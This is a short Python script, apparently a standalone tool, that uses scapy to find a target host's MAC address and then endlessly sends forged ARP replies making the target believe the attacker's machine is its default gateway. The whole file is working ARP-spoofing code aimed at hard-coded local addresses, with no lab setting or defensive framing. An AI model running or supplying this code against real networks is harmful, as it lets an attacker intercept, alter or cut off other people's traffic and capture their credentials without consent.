from scapy.all import ARP, Ether, srp, send

def get_mac(ip_target):
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_target)
    reply, _ = srp(arp_request, timeout=3, verbose=0)
    if reply:
        return reply[0][1].src
    return None

def spoof(ip_target, mac_target, ip_spoof):
    arp_spoofed_packet = ARP(pdst=ip_target, hwdst=mac_target, psrc=ip_spoof, op=2)
    send(arp_spoofed_packet, verbose=0)

ip_target = '10.100.102.55'
default_gateway = '10.100.102.1'
target_mac = None

while not target_mac:
    target_mac = get_mac(ip_target)
    if not target_mac:
        print("MAC address not found")

while True:
    spoof(ip_target, target_mac, default_gateway)
    print("Spoofing is active")
